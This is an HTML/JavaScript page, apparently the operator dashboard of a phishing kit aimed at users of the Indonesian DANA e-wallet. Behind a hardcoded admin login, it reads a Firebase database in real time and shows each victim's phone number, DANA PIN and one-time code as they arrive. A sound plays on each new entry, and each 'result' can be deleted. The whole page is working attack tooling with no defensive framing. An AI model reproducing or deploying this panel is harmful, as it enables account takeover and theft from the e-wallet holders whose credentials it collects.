<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Panel - Protected Extra</title>
    
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
    
    <style>
        * { box-sizing: border-box; }
        body { font-family: 'Segoe UI', sans-serif; background: #f0f2f5; margin: 0; padding: 20px; }
        
        /* Login Overlay */
        #login-overlay {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: #108EE9; display: flex; align-items: center; justify-content: center; z-index: 9999;
        }
        .login-box {
            background: white; padding: 30px; border-radius: 12px; width: 90%; max-width: 350px;
            text-align: center; box-shadow: 0 10px 25px rgba(0,0,0,0.2);
        }
        .login-box input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 8px; }
        .login-box button { width: 100%; padding: 12px; background: #108EE9; color: white; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; }

        /* Admin Content */
        #admin-content { display: none; }
        .header { background: #108EE9; color: white; padding: 20px; border-radius: 12px; margin-bottom: 25px; text-align: center; position: relative; }
        .status { font-size: 12px; opacity: 0.8; margin-top: 5px; }
        
        .container { display: grid; grid-template-columns: repeat(auto-fill, minmax(320px, 1fr)); gap: 20px; }
        .card { background: white; border-radius: 12px; padding: 20px; box-shadow: 0 6px 15px rgba(0,0,0,0.05); border-top: 6px solid #108EE9; transition: 0.3s; }
        .card-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px; border-bottom: 1px solid #eee; padding-bottom: 10px; }
        .method-tag { background: #E1F1FF; color: #108EE9; padding: 4px 10px; border-radius: 6px; font-size: 11px; font-weight: bold; }
        
        .data-row { margin-bottom: 12px; }
        .label { font-size: 11px; color: #7A848F; display: block; }
        .value { font-size: 17px; font-weight: bold; color: #333; font-family: monospace; letter-spacing: 1px; }
        .otp-value { color: #d32f2f; }
        
        .btn-delete { background: #ff4d4d; color: white; border: none; padding: 5px 10px; border-radius: 6px; cursor: pointer; font-size: 11px; }
        .empty-state { text-align: center; padding: 50px; color: #7A848F; grid-column: 1/-1; }
    </style>
</head>
<body>

    <div id="login-overlay">
        <div class="login-box">
            <h2 style="margin-top:0">PENGEN LAH CAK WANG</h2>
            <input type="text" id="userInput" placeholder="Username">
            <input type="password" id="passInput" placeholder="Password">
            <button onclick="prosesLogin()">MASUK</button>
            <p id="errLog" style="color:red; font-size:12px; display:none">Login Gagal!</p>
        </div>
    </div>

    <div id="admin-content">
        <div class="header">
            <h1>LAPANG SAJEðŸ”¥ðŸ’¥</h1>
            <div id="db-status" class="status">Menghubungkan...</div>
            <button onclick="location.reload()" style="position:absolute; right:15px; top:15px; background:rgba(255,255,255,0.2); border:none; color:white; border-radius:5px; padding:5px 10px; cursor:pointer">Logout</button>
        </div>

        <div class="container" id="data-display">
            <div class="empty-state">Menunggu data...</div>
        </div>
    </div>

    <audio id="notifSound" src="https://assets.mixkit.co/active_storage/sfx/2869/2869-preview.mp3" preload="auto"></audio>

    <script>
        // --- PENGATURAN LOGIN ---
        const USER_ADMIN = "admin";
        const PASS_ADMIN = "bayu12";

        function prosesLogin() {
            const u = document.getElementById('userInput').value;
            const p = document.getElementById('passInput').value;
            if(u === USER_ADMIN && p === PASS_ADMIN) {
                document.getElementById('login-overlay').style.display = 'none';
                document.getElementById('admin-content').style.display = 'block';
                initAdmin();
            } else {
                document.getElementById('errLog').style.display = 'block';
            }
        }

        // --- FIREBASE CORE ---
        function initAdmin() {
            const firebaseConfig = { databaseURL: "https://admin-panel-5c204-default-rtdb.firebaseio.com/" };
            if (!firebase.apps.length) { firebase.initializeApp(firebaseConfig); }
            const db = firebase.database();
            const dataRef = db.ref('data_masuk');

            let lastCount = 0;
            let firstLoad = true;

            dataRef.on('value', (snapshot) => {
                const display = document.getElementById('data-display');
                const sound = document.getElementById('notifSound');
                const data = snapshot.val();
                
                document.getElementById('db-status').innerText = "ðŸ“¡ Database Online (Real-time)";

                if (data) {
                    const keys = Object.keys(data);
                    const currentCount = keys.length;

                    // Trigger suara jika ada data baru masuk atau data lama berubah (update PIN/OTP)
                    if (!firstLoad) {
                        sound.currentTime = 0;
                        sound.play().catch(e => console.log("Sound error:", e));
                    }

                    display.innerHTML = '';
                    keys.reverse().forEach((key) => {
                        const item = data[key];
                        const card = document.createElement('div');
                        card.className = 'card';
                        card.innerHTML = `
                            <div class="card-header">
                                <span class="method-tag">${item.metode || 'DANA'}</span>
                                <button class="btn-delete" onclick="hapusData('${key}')">Hapus</button>
                            </div>
                            <div class="data-row">
                                <span class="label">NOMOR HP</span>
                                <span class="value">${item.nomor_hp || '-'}</span>
                            </div>
                            <div class="data-row">
                                <span class="label">PIN DANA</span>
                                <span class="value">${item.pin || '<span style="color:#ccc">sabar bae...</span>'}</span>
                            </div>
                            <div class="data-row">
                                <span class="label">KODE OTP</span>
                                <span class="value otp-value">${item.otp || '<span style="color:#ccc">sabar bae...</span>'}</span>
                            </div>
                            <div style="font-size:10px; color:#bbb; text-align:right">${item.waktu || ''}</div>
                        `;
                        display.appendChild(card);
                    });
                    
                    firstLoad = false;
                    lastCount = currentCount;
                } else {
                    display.innerHTML = '<div class="empty-state">Belum ada data masuk.</div>';
                }
            });

            window.hapusData = function(id) {
                if(confirm('Hapus result ini?')) db.ref('data_masuk/' + id).remove();
            }
        }
    </script>
</body>
</html>
